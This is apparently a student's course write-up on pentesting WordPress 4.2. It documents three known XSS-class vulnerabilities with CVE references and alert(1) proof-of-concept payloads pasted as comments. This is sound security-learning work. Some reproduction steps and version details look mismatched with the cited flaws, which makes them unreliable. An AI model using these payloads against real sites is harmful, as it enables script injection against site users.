# Project 7 - WordPress Pentesting

Time spent: 5 hours spent in total

> Objective: Find, analyze, recreate, and document 3 affecting an old version of WordPress

Version of WordPress Tested: 4.2

# Vulnerability 1 - Legacy Theme Preview Cross-Site Scripting (XSS)
Steps to reproduce:
1. Go to any post.
2. Paste the following as a comment:
```
<a href='/wp-admin/' title="" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(1)//'>Test</a>
```
3. Hover over the posted comment.
4. Alert(1) will pop up.

Type of Attack: XSS

Versions: 

[!] Title: WordPress <= 4.2.3 - Legacy Theme Preview Cross-Site Scripting (XSS)

[i] Fixed in: 4.2.4

Sources: 
1. Reference: https://wpvulndb.com/vulnerabilities/8133
2. Reference: https://core.trac.wordpress.org/changeset/33549
3. Reference: https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html
4. Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5734

GIF: https://i.imgur.com/AWc0xbA.gif

# Vulnerability 2 - Authenticated Cross-Site Scripting (XSS)
Steps to reproduce:
1. Go to any post.
2. Paste the following as a comment:
```
http://www.example.com/wp-admin/customize.php?theme=<svg onload=alert(1)>
```
3. Alert(1) will pop up.

Type of Attack: XSS

Versions: 

[!] Title: WordPress  3.7-4.4 - Authenticated Cross-Site Scripting (XSS)

[i] Fixed in: 4.2.6

Sources: 
1. Reference: https://wpvulndb.com/vulnerabilities/8358
2. Reference: https://wordpress.org/news/2016/01/wordpress-4-4-1-security-and-maintenance-release/
3. Reference: https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87
4. Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564

GIF: https://i.imgur.com/ZmwMJau.gif


# Vulnerability 3 - Pupload Same Origin Method Execution (SOME)
Steps to reproduce:
1. Go to any post.
2. Paste the following as a comment:
```
<button onclick="fire()">Click</button>
<script>
function fire() {
 open('javascript:alert(1)');
}
</script>
```
3. Click on the button.
4. Alert(1) will pop up.

Type of Attack: XSS

Versions: 

[!] Title: WordPress <= 4.5.1 - Pupload Same Origin Method Execution (SOME)

[i] Fixed in: 4.2.8

Sources: 
1. Reference: https://wpvulndb.com/vulnerabilities/8489
2. Reference: https://wordpress.org/news/2016/05/wordpress-4-5-2/
3. Reference: https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8
4. Reference: https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e
5. Reference: http://avlidienbrunn.com/wp_some_loader.php
6. Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4566

GIF: https://i.imgur.com/eS4AppI.gif

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work:
Some vulnerabilities would work once in a while even when using the same exact code. 
Recording with LiceCap wasn't in focus.

## License

    Copyright [2017] [Sunny Liang]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
